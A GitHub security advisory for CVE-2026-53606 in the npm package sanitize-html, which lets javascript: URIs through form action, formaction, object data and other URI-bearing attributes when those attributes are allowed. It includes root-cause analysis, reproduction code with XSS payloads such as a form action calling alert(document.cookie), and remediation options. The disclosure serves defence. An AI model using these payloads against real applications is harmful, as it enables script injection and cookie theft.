# [M] sanitize-html has incomplete URI scheme validation in that allows javascript: URIs through action, formaction, data, poster, and background attributes

## Summary
Severity: Medium
Advisory: GHSA-vccv-cmxp-4j9h
CVE: CVE-2026-53606
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-vccv-cmxp-4j9h
Type: github-advisory

## Affected
- npm: `sanitize-html` — affected >=1.18.0 <2.17.5

## Details
## Summary

sanitize-html uses `allowedSchemesAppliedToAttributes` (default: `['href', 'src', 'cite']`) to gate the `naughtyHref()` function that blocks dangerous URI schemes like `javascript:` and `vbscript:`. The HTML specification defines 10+ attributes that accept URIs (`action`, `formaction`, `data`, `poster`, `background`, `ping`, `xlink:href`, `dynsrc`, `lowsrc`), but none of these are included in the default gate list. When a developer allows any of these attributes in their configuration, `javascript:` URIs pass through completely unmodified, enabling XSS.

The library has zero awareness of these URI-bearing attributes — none appear anywhere in the 854-line source file (verified by grep). No warning mechanism exists, and the README provides no security guidance about expanding `allowedSchemesAppliedToAttributes` when allowing form or media attributes.

## Severity

Exploitation requires non-default configuration: the developer must explicitly allow a non-default tag (e.g., `form`) AND a non-default attribute (e.g., `action`). Default configuration is NOT vulnerable. However, this is a common configuration pattern for CMS platforms, form builders, and rich content editors.

## Affected Versions

All versions of sanitize-html from v1.18.0 (which introduced `allowedSchemesAppliedToAttributes`) through at least v2.17.2. The default list has been `['href', 'src', 'cite']` since introduction and has never been expanded.

## Root Cause

**File**: `index.js:329` (sanitize-html 2.10.0, confirmed same in 2.17.x)

```javascript
// Line 329 — The gate that controls scheme validation
if (options.allowedSchemesAppliedToAttributes.indexOf(a) >= 0) {
    if (naughtyHref(name, value)) {
        delete frame.attribs[a];
        return;
    }
}
```

**Default list at line 829**:
```javascript
allowedSchemesAppliedToAttributes: ['href', 'src', 'cite'],
```

The `naughtyHref()` function (lines 627-667) correctly blocks `javascript:`, `vbscript:`, and other dangerous schemes. However, it has exactly 2 call sites in the entire codebase (lines 330 and 395), both inside the `indexOf` gate. There is no ungated path.

When attribute name is `action`, `formaction`, `data`, `poster`, `background`, etc.:
- `indexOf('action')` returns `-1`
- The `if` block is skipped entirely
- `naughtyHref()` is never called
- `javascript:alert(1)` passes through unmodified

The `escapeHtml()` function at line 464 provides no defense — it only encodes `& < > "` characters, which are not present in `javascript:alert(1)`.

**Data Flow**:
```
Attacker input: <form action="javascript:alert(document.cookie)">
1. htmlparser2 parses → tag='form', attribs={action:'javascript:alert(document.cookie)'}
2. index.js:298 → allowedAttributes check: 'action' in developer config → PASS
3. index.js:329 → ['href','src','cite'].indexOf('action') → -1 → SKIP naughtyHref()
4. index.js:464 → escapeHtml('javascript:alert(document.cookie)') → unchanged
5. OUTPUT: <form action="javascript:alert(document.cookie)">
```

## Steps to Reproduce

```javascript
const sanitize = require('sanitize-html');

// ===== VECTOR 1: form action (100% reliable, all modern browsers) =====
const v1 = sanitize(
    '<form action="javascript:alert(document.cookie)"><button>Submit</button></form>',
    {
        allowedTags: ['form', 'button'],
        allowedAttributes: { form: ['action'] }
    }
);
console.log('V1 (action):', v1);
// OUTPUT: <form action="javascript:alert(document.cookie)"><button>Submit</button></form>
// XSS triggers when user submits the form

// ===== VECTOR 2: button formaction (100% reliable) =====
const v2 = sanitize(
    '<button formaction="javascript:alert(1)">Click</button>',
    {
        allowedTags: ['button'],
        allowedAttributes: { button: ['formaction'] }
    }
);
console.log('V2 (formaction):', v2);
// OUTPUT: <button formaction="javascript:alert(1)">Click</button>

// ===== VECTOR 3: object data =====
const v3 = sanitize(
    '<object data="javascript:alert(1)"></object>',
    {
        allowedTags: ['object'],
        allowedAttributes: { object: ['data'] }
    }
);
console.log('V3 (data):', v3);
// OUTPUT: <object data="javascript:alert(1)"></object>

// ===== CONTROL: href IS scheme-checked (expected behavior) =====
const ctrl = sanitize(
    '<a href="javascript:alert(1)">click</a>',
    {
        allowedTags: ['a'],
        allowedAttributes: { a: ['href'] }
    }
);
console.log('Control (href):', ctrl);
// OUTPUT: <a>click</a>   ← href correctly stripped by naughtyHref()
```

**Observed behavior**: `javascript:` preserved on `action`/`formaction`/`data` but correctly stripped on `href`.

**Expected behavior**: `javascript:` should be stripped on ALL URI-bearing attributes, or at minimum, the library should warn developers when they allow URI-bearing attributes not covered by scheme validation.

## Impact

An attacker can achieve XSS in applications that use sanitize-html with non-default configurations allowing URI-bearing attributes:

- `<form action="javascript:...">` — XSS on form submission (all modern browsers)
- `<button formaction="javascript:...">` — per-button XSS override (all modern browsers)
- `<object data="javascript:...">` — object load XSS (Chrome, Firefox)
- `<video poster="javascript:...">` — limited browser support but spec-valid

**Common vulnerable configurations**:
- CMS platforms allowing form elements for user-generated content
- Form builder applications
- Rich text editors with extended tag allowlists
- Email template editors allowing media/embed tags

**Mitigating factors**:
- Default configuration is NOT vulnerable
- Requires double opt-in: non-default tag + non-default attribute
- CSP `form-action` directive mitigates form-based vectors
- Developers CAN manually add attributes to `allowedSchemesAppliedToAttributes`

## Remediation

**Option 1 (Recommended)**: Expand the default `allowedSchemesAppliedToAttributes` list:

```javascript
// index.js line 829, change from:
allowedSchemesAppliedToAttributes: ['href', 'src', 'cite'],

// to:
allowedSchemesAppliedToAttributes: [
    'href', 'src', 'cite', 'action', 'formaction',
    'data', 'poster', 'background', 'ping',
    'xlink:href', 'dynsrc', 'lowsrc'
],
```

**Option 2**: Apply `naughtyHref()` to ALL attributes by default (invert the gate logic).

**Option 3**: Add a runtime warning when developers allow URI-bearing attributes not in `allowedSchemesAppliedToAttributes` (analogous to `vulnerableTags` warning for `script`/`style` at lines 124-129).

## Reporter

Kevin Lee (Changseon Lee)
OPCIA Corp. / PeanutAI Inc.
Seoul, South Korea
GitHub: crattack

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-vccv-cmxp-4j9h
- https://nvd.nist.gov/vuln/detail/CVE-2026-53606
- https://github.com/apostrophecms/apostrophe/pull/5464
- https://github.com/apostrophecms/apostrophe/commit/5a88e9630cbbdde33154ef8abe7557ddf7be418b
- https://github.com/apostrophecms/apostrophe
- https://github.com/apostrophecms/apostrophe/releases/tag/sanitize-html@2.17.5
